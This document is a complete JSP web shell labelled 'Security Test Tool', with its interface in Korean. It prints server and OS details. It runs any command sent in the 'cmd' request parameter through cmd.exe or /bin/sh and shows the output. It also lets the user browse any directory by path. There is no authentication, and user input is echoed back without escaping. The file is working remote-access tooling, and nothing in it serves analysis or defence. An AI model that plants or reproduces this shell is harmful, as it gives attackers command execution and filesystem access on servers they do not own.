<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Security Test Tool</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; margin: 20px; }
        .container { background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        pre { background-color: #f5f5f5; padding: 10px; border-radius: 3px; overflow-x: auto; }
        input[type="text"] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type="submit"] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; border-radius: 3px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>시스템 정보</h2>
        <pre>
서버 정보: <%= application.getServerInfo() %>
서블릿 버전: <%= application.getMajorVersion() %>.<%= application.getMinorVersion() %>
JSP 버전: <%= JspFactory.getDefaultFactory().getEngineInfo().getSpecificationVersion() %>
Java 버전: <%= System.getProperty("java.version") %>
운영체제: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %> <%= System.getProperty("os.arch") %>
        </pre>
        
        <h2>명령어 실행</h2>
        <form method="post">
            <input type="text" name="cmd" value="<%= request.getParameter("cmd") == null ? "whoami" : request.getParameter("cmd") %>">
            <input type="submit" value="실행">
        </form>
        
        <% if (request.getParameter("cmd") != null) { %>
        <h3>실행 결과:</h3>
        <pre>
<%
    String cmd = request.getParameter("cmd");
    try {
        Process process;
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        } else {
            process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        }
        
        // 명령어 출력 읽기
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        
        // 표준 출력 내용
        String s;
        while ((s = stdInput.readLine()) != null) {
            out.println(s);
        }
        
        // 표준 에러 내용
        while ((s = stdError.readLine()) != null) {
            out.println("<span style='color:red'>" + s + "</span>");
        }
    } catch (Exception e) {
        out.println("오류 발생: " + e.getMessage());
    }
%>
        </pre>
        <% } %>
        
        <h2>현재 디렉토리 탐색</h2>
        <%
            String path = request.getParameter("path");
            if (path == null || path.isEmpty()) {
                path = System.getProperty("user.dir");
            }
            
            File dir = new File(path);
            File[] files = dir.listFiles();
        %>
        <p>현재 경로: <%= path %></p>
        <table border="1" style="width:100%; border-collapse: collapse;">
            <tr>
                <th>타입</th>
                <th>이름</th>
                <th>크기</th>
                <th>최종 수정일</th>
            </tr>
            <% if (files != null) { %>
                <% for (File file : files) { %>
                    <tr>
                        <td><%= file.isDirectory() ? "디렉토리" : "파일" %></td>
                        <td>
                            <% if (file.isDirectory()) { %>
                                <a href="?path=<%= file.getAbsolutePath() %>"><%= file.getName() %></a>
                            <% } else { %>
                                <%= file.getName() %>
                            <% } %>
                        </td>
                        <td><%= file.isFile() ? file.length() + " bytes" : "-" %></td>
                        <td><%= new Date(file.lastModified()) %></td>
                    </tr>
                <% } %>
            <% } %>
        </table>
    </div>
</body>
</html>